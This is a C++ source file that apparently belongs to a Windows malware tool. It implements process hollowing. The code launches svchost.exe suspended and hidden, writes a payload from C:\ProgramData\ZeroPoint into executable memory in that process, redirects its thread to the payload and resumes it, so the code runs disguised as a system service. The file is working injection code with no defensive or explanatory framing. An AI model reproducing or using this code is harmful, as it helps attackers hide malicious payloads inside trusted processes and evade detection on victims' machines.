#include "Stealth.h"
#include <windows.h>
#include <winternl.h>
#include <fstream>
#include <vector>
#include <string>

#pragma comment(lib, "ntdll.lib")

std::vector<BYTE> ReadPayload(const std::string& path) {
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file) return {};
    auto size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<BYTE> buffer(size);
    file.read(reinterpret_cast<char*>(buffer.data()), size);
    return buffer;
}

bool InjectGhostProcess(const std::string& targetCmd, const std::string& payloadPath) {
    std::vector<BYTE> payload = ReadPayload(payloadPath);
    if (payload.empty()) return false;

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(nullptr, const_cast<LPSTR>(targetCmd.c_str()), nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
        return false;
    }

    CONTEXT ctx = { CONTEXT_FULL };
    GetThreadContext(pi.hThread, &ctx);

    PVOID remoteBase = VirtualAllocEx(pi.hProcess, nullptr, payload.size(),
                                      MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    WriteProcessMemory(pi.hProcess, remoteBase, payload.data(), payload.size(), nullptr);

    ctx.Rcx = (DWORD64)remoteBase;
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

bool PerformHollowing() {
    return InjectGhostProcess("C:\\Windows\\System32\\svchost.exe -k LocalService", 
                              "C:\\ProgramData\\ZeroPoint\\ZeroPointPayload.exe");
}
